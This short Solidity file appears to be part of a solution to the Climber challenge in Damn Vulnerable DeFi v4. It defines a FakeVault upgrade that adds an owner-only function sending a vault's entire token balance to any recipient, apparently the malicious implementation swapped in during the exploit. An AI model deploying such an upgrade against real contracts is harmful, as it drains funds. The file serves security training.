// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FakeVault is ClimberVault {

    constructor() {
        _disableInitializers();
    }
    
    function emergencyWithdraw(address token, address recipient) external onlyOwner {
        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
    }
}